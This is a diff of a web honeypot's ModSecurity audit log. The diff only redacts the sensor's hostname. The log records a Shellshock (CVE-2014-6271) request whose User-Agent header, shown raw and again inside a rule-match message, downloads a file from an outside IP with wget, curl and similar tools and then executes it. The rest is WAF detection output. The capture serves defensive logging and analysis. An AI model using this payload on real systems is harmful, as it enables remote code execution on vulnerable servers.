@@ -1,12 +1,12 @@
 --VSagh38AAQEAAB@BMFUAAAAC-A--
-[09/Apr/2015:15:53:43 +0000] VSagh38AAQEAAB@BMFUAAAAC 74.208.47.19 39498 honeypot-sensor 80
+[09/Apr/2015:15:53:43 +0000] VSagh38AAQEAAB@BMFUAAAAC 74.208.47.19 39498 REDACTED_HONEYPOT_SENSOR 80
 --VSagh38AAQEAAB@BMFUAAAAC-B--
 GET /cgi-bin/main.cgi HTTP/1.1
 Accept: */*
 Accept-Language: en-us
 Accept-Encoding: gzip, deflate
 User-Agent: () { :;};/usr/bin/perl -e 'print "Content-Type: text/plain\r\n\r\nXSUCCESS!";system("cd /tmp;cd /var/tmp;rm -rf .c.txt;rm -rf .d.txt ; wget http://109.228.25.87/.c.txt ; curl -O http://109.228.25.87/.c.txt ; fetch http://109.228.25.87/.c.txt ; lwp-download http://109.228.25.87/.c.txt; chmod +x .c.txt* ; sh .c.txt* ");'
-Host: honeypot-sensor
+Host: REDACTED_HONEYPOT_SENSOR
 Connection: Close
 
 --VSagh38AAQEAAB@BMFUAAAAC-E--
@@ -25,12 +25,12 @@ Connection: close
 Content-Type: text/html; charset=iso-8859-1
 
 --VSagh38AAQEAAB@BMFUAAAAC-H--
-Message: Warning. String match "() {" at REQUEST_HEADERS:User-Agent. [file "remote server"] [line "-1"] [id "2100080"] [msg "SLR: Bash ENV Variable Injection Attack"] [tag "Host: honeypot-sensor"] [tag "CVE-2014-6271"] [tag "http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6271"] [tag "https://securityblog.redhat.com/2014/09/24/bash-specially-crafted-environment-variables-code-injection-attack/"]
-Message: Warning. Operator EQ matched 1 at IP:block. [file "/opt/wasc-honeypot/etc/crs/rules/REQUEST-10-IP-REPUTATION.conf"] [line "31"] [id "981140"] [msg "Request from Known Malicious Client (Based on previous traffic violations)."] [data "Previous Block Reason: Request Indicates a Security Scanner Scanned the Site"] [severity "CRITICAL"] [tag "Host: honeypot-sensor"] [tag "IP_REPUTATION/MALICIOUS_CLIENT"]
-Message: Warning. Matched phrase "LWP" at REQUEST_HEADERS:User-Agent. [file "/opt/wasc-honeypot/etc/crs/rules/REQUEST-13-SCANNER-DETECTION.conf"] [line "39"] [id "990002"] [rev "2"] [msg "Request Indicates a Security Scanner Scanned the Site"] [data "Matched Data: LWP found within REQUEST_HEADERS:User-Agent: () { :;};/usr/bin/perl -e 'print \x22content-type: text/plain\x5cr\x5cn\x5cr\x5cnxsuccess!\x22;system(\x22cd /tmp;cd /var/tmp;rm -rf .c.txt;rm -rf .d.txt ; wget http://109.228.25.87/.c.txt ; curl -o http://109.228.25.87/.c.txt ; fetch http://109.228.25.87/.c.txt ; lwp-download http://109.228.25.87/.c.txt; chmod +x .c.txt* ; sh .c.txt* \x22);'"] [severity "CRITICAL"] [ver "OWASP_CRS/3.0.0"] [maturity "9"] [accuracy "9"] [tag "Host: honeypot-sensor"] [tag "OWASP_CRS/AUTOMATION/SECURITY_SCANNER"] [tag "WASCTC/WASC-21"] [tag "OWASP_TOP_10/A7"] [tag "PCI/6.5.10"]
-Message: Warning. Operator EQ matched 1 at IP:block. [file "/opt/wasc-honeypot/etc/crs/rules/REQUEST-49-BLOCKING-EVALUATION.conf"] [line "26"] [id "981175"] [msg "Request Denied by IP Reputation Enforcement."] [data "Previous Block Reason: Request Indicates a Security Scanner Scanned the Site"] [severity "CRITICAL"] [tag "Host: honeypot-sensor"]
-Message: Warning. Operator GE matched 5 at TX:anomaly_score. [file "/opt/wasc-honeypot/etc/crs/rules/REQUEST-49-BLOCKING-EVALUATION.conf"] [line "191"] [id "981176"] [msg "Inbound Anomaly Score Exceeded (Total Score: 10, Last Matched Message: Request Indicates a Security Scanner Scanned the Site"] [severity "CRITICAL"] [tag "Host: honeypot-sensor"]
-Message: Warning. Operator GE matched 5 at TX:inbound_anomaly_score. [file "/opt/wasc-honeypot/etc/crs/rules/RESPONSE-80-CORRELATION.conf"] [line "67"] [id "981204"] [msg "Inbound Anomaly Score Exceeded (Total Inbound Score: 10): Request Indicates a Security Scanner Scanned the Site"] [tag "Host: honeypot-sensor"]
+Message: Warning. String match "() {" at REQUEST_HEADERS:User-Agent. [file "remote server"] [line "-1"] [id "2100080"] [msg "SLR: Bash ENV Variable Injection Attack"] [tag "Host: REDACTED_HONEYPOT_SENSOR"] [tag "CVE-2014-6271"] [tag "http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6271"] [tag "https://securityblog.redhat.com/2014/09/24/bash-specially-crafted-environment-variables-code-injection-attack/"]
+Message: Warning. Operator EQ matched 1 at IP:block. [file "/opt/wasc-honeypot/etc/crs/rules/REQUEST-10-IP-REPUTATION.conf"] [line "31"] [id "981140"] [msg "Request from Known Malicious Client (Based on previous traffic violations)."] [data "Previous Block Reason: Request Indicates a Security Scanner Scanned the Site"] [severity "CRITICAL"] [tag "Host: REDACTED_HONEYPOT_SENSOR"] [tag "IP_REPUTATION/MALICIOUS_CLIENT"]
+Message: Warning. Matched phrase "LWP" at REQUEST_HEADERS:User-Agent. [file "/opt/wasc-honeypot/etc/crs/rules/REQUEST-13-SCANNER-DETECTION.conf"] [line "39"] [id "990002"] [rev "2"] [msg "Request Indicates a Security Scanner Scanned the Site"] [data "Matched Data: LWP found within REQUEST_HEADERS:User-Agent: () { :;};/usr/bin/perl -e 'print \x22content-type: text/plain\x5cr\x5cn\x5cr\x5cnxsuccess!\x22;system(\x22cd /tmp;cd /var/tmp;rm -rf .c.txt;rm -rf .d.txt ; wget http://109.228.25.87/.c.txt ; curl -o http://109.228.25.87/.c.txt ; fetch http://109.228.25.87/.c.txt ; lwp-download http://109.228.25.87/.c.txt; chmod +x .c.txt* ; sh .c.txt* \x22);'"] [severity "CRITICAL"] [ver "OWASP_CRS/3.0.0"] [maturity "9"] [accuracy "9"] [tag "Host: REDACTED_HONEYPOT_SENSOR"] [tag "OWASP_CRS/AUTOMATION/SECURITY_SCANNER"] [tag "WASCTC/WASC-21"] [tag "OWASP_TOP_10/A7"] [tag "PCI/6.5.10"]
+Message: Warning. Operator EQ matched 1 at IP:block. [file "/opt/wasc-honeypot/etc/crs/rules/REQUEST-49-BLOCKING-EVALUATION.conf"] [line "26"] [id "981175"] [msg "Request Denied by IP Reputation Enforcement."] [data "Previous Block Reason: Request Indicates a Security Scanner Scanned the Site"] [severity "CRITICAL"] [tag "Host: REDACTED_HONEYPOT_SENSOR"]
+Message: Warning. Operator GE matched 5 at TX:anomaly_score. [file "/opt/wasc-honeypot/etc/crs/rules/REQUEST-49-BLOCKING-EVALUATION.conf"] [line "191"] [id "981176"] [msg "Inbound Anomaly Score Exceeded (Total Score: 10, Last Matched Message: Request Indicates a Security Scanner Scanned the Site"] [severity "CRITICAL"] [tag "Host: REDACTED_HONEYPOT_SENSOR"]
+Message: Warning. Operator GE matched 5 at TX:inbound_anomaly_score. [file "/opt/wasc-honeypot/etc/crs/rules/RESPONSE-80-CORRELATION.conf"] [line "67"] [id "981204"] [msg "Inbound Anomaly Score Exceeded (Total Inbound Score: 10): Request Indicates a Security Scanner Scanned the Site"] [tag "Host: REDACTED_HONEYPOT_SENSOR"]
 Apache-Error: [file "core.c"] [line 3650] [level 3] File does not exist: /opt/wasc-honeypot/httpd/htdocs/cgi-bin
 Stopwatch: 1428594823855316 3435 (- - -)
 Stopwatch2: 1428594823855316 3435; combined=2483, p1=199, p2=1565, p3=2, p4=354, p5=277, sr=77, sw=86, l=0, gc=0
